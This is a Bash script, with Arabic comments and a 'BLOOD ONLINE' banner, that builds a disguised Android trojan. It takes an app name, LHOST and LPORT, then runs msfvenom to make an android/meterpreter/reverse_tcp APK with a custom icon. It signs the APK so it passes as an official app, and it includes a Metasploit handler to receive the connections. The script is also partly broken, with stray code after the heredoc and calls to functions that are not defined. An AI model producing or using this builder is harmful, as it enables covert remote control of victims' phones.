cat << 'EOF' > ~/xxszmsx.sh
#!/bin/bash

# تعريف الألوان الدموية الفخمة
RED='\033[0;31m'
BRED='\033[1;31m'
NC='\033[0m'

# دالة الواجهة الاحترافية
show_banner() {
    clear
    echo -e "${BRED}┌──────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRED}│${NC}  ${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED}  ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝  ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED}  ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗  ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ${BRED}│${NC}"
    echo -e "${BRED}├──────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BRED}│${NC}  ${RED}BUILDER: XXSZMSX V100${NC}          ${RED}STATUS: BLOOD ONLINE${NC}      ${BRED}│${NC}"
    echo -e "${BRED}└──────────────────────────────────────────────────────────┘${NC}"
}

show_banner

# طلب البيانات بأسلوب احترافي
echo -e "${RED}[†] مرحبًا بك يا مازن.. فلنبدأ صناعة المصيدة:${NC}"
echo -n -e "${RED}[+] اسم التطبيق: ${NC}"; read app_name
echo -n -e "${RED}[+] الرابط (LHOST): ${NC}"; read lh
echo -n -e "${RED}[+] البورت (LPORT): ${NC}"; read lp

echo -e "\n${RED}[*] جاري حقن الأكواد البرمجية وصناعة الـ APK...${NC}"

# بناء الـ APK الخام مع دمج الأيقونة الدموية داخل التطبيق نفسه
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R --icon $HOME/icon.png -o "temp.apk" &> /dev/null

# توقيع التطبيق توقيع رقمي (V2/V3) عشان يشتغل كأنه رسمي
keytool -genkey -v -keystore mazen.keystore -alias mazen -keyalg RSA -keysize 2048 -validity 10000 -storepass blood123 -keypass blood123 -dname "CN=xxszmsx, OU=H, O=B, L=KW, S=AH, C=KW" &> /dev/null
apksigner sign --ks mazen.keystore --ks-pass pass:blood123 --out "$HOME/Downloads/$app_name.apk" temp.apk &> /dev/null

rm temp.apk mazen.keystore 2>/dev/null

echo -e "\n${BRED}=======================================${NC}"
echo -e "${BRED}✔ تم بنجاح! الملف جاهز في التنزيلات باسم: $app_name.apk${NC}"
echo -e "${BRED}=======================================${NC}"

echo -e "${RED}[!] اضغط Enter للعودة للقائمة...${NC}"
read
EOF

chmod +x ~/xxszmsx.sh
start_listener() {
    clear
    read -p "Enter Port to Listen on: " lp
    echo -e "${RED}[*] Starting Control Center on Port $lp...${NC}"
    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport $lp; exploit -j"
}

check_deps
main_menu
EOF

chmod +x ~/xxszmsx.sh
